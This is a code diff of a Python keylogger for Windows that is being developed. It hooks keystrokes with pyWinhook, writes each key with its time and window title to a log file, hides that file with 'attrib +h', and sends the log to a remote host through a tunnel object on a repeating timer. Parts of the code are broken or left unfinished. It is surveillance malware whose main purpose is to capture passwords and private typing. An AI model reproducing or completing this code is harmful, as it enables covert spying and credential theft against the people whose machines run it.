@@ -1,65 +1,61 @@
-import pyHook, pythoncom, socket,os
+import pyWinhook, pythoncom, socket, os
 import threading
 from src import base64cipher
-##create a server how lisen the attact host
-# server = socket.socket()
-#
-# server.bind("127.0.0.1", 5555)
-# server.listen(1)
-# c,a = server.accept()
-filepath="log.txt"
-#turn file to hidden
+from src import newServer
+
+filepath = "log.txt"
+
+
+# turn file to hidden
 def hide():
+    file = open(filepath, "w+", encoding='utf-8')
+    file.close()
     p = os.popen('attrib +h ' + filepath)
     t = p.read()
     p.close()
 
 def opensocket():
+    openTunnel = newServer.transfer(filepath)
+    return openTunnel
 
-
-##create a server how lisen the attact host
-# server = socket.socket()
-#
-# server.bind("127.0.0.1", 5555)
-# server.listen(1)
-# c,a = server.accept()
 
 def onKeyDown(e):
-    s =f"{e.GetKey()} \t {e.Time} \t {e.WindowName}"
+    s = f"{e.GetKey()} \t {e.Time} \t {e.WindowName} \n"
     # c.send(s.encode())
     writeToFile(s)
     return 1
 
+
 def writeToFile(s):
-    file = open(filepath, "a")
+    file = open(filepath, "a", encoding='utf-8')
     msg = encodeTXT(s)
-    file.write(msg)
+    file.write(s)
+
 
 def encodeTXT(s):
     return base64cipher.encodeMsg(s)
 
+
 def start():
-    hide()
-    opensocket()
-    hm = pyHook.HookManager()
-    hm.HookKeyboard()
-    #evry evend from the keybord will pawer onKeyDown function
-    hm.SubscribeKeyDown(onKeyDown)
-    pythoncom.PumpMessages()
+    # hide()
+    ot = opensocket()
+    # hm = pyWinhook.HookManager()
+    # hm.HookKeyboard()
+    # # every event from the keybord will pawer onKeyDown function
+    # hm.SubscribeKeyDown(onKeyDown)
+    # pythoncom.PumpMessages()
+    send(ot)
 
-def send():
-    #something
 
-def report():
-    send()
-    threading.Timer(1800, report).start()
+def send(ot):
+    # something
+    ot.send_file()
 
+
+def report(ot):
+    send(ot)
+    threading.Timer(2, report).start()
+
+
+# Start tunnel
 start()
-# hm=pyHook.HookManager()
-# hm.HookKeyboard()
-#
-# #evry evend from the keybord will pawer onKeyDown function
-# hm.SubscribeKeyDown(onKeyDown)
-#
-# #make the consol stay even there is no event
-# pythoncom.PumpMessages()
